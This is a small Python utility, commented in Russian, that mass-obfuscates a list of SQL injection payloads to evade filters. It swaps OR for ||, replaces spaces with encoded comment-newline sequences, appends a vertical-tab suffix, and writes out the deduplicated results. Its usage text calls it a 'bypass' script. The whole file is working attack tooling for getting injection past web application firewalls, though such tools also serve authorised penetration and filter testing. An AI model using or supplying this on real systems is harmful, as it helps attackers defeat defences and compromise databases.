#!/usr/bin/env python3
# sqli_transform2.py
# Преобразует SQL-пayload'ы по правилам:
# 1) заменяет отдельное слово OR (регистронезависимо) на ||
# 2) заменяет пробелы ' ' на %23%0a
# 3) добавляет %0b в конец (если ещё нет)
#
# Usage:
#   python3 sqli_transform2.py input.txt
#
# Output: input.txt.obf2

import sys
import re
from pathlib import Path

RE_OR = re.compile(r'\bOR\b', flags=re.IGNORECASE)
RE_HAS_VTAB = re.compile(r'%0[bB]')

def transform_line(line: str) -> str:
    s = line
    # 1) OR -> ||
    s = RE_OR.sub('||', s)
    # 2) spaces -> %23%0a
    s = s.replace(' ', '%23%0a')
    # 3) append %0b if not present (case-insensitive)
    if not RE_HAS_VTAB.search(s):
        s = s + '%0b'
    return s

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 sqli_bypass_swapSpaces.py input_file.txt", file=sys.stderr)
        sys.exit(2)

    in_path = Path(sys.argv[1])
    if not in_path.is_file():
        print(f"Input file not found: {in_path}", file=sys.stderr)
        sys.exit(1)

    out_path = in_path.with_name(in_path.name + ".obf2")

    seen = set()
    out_lines = []
    total = 0

    with in_path.open("r", encoding="utf-8", errors="ignore") as f:
        for raw in f:
            total += 1
            line = raw.rstrip("\r\n")
            if not line:
                continue
            obf = transform_line(line)
            if obf in seen:
                continue
            seen.add(obf)
            out_lines.append(obf)

    with out_path.open("w", encoding="utf-8") as fo:
        for l in out_lines:
            fo.write(l + '\n')

    print(f"Done. Processed {total} input lines. Wrote {len(out_lines)} unique payloads to {out_path}.")

if __name__ == "__main__":
    main()
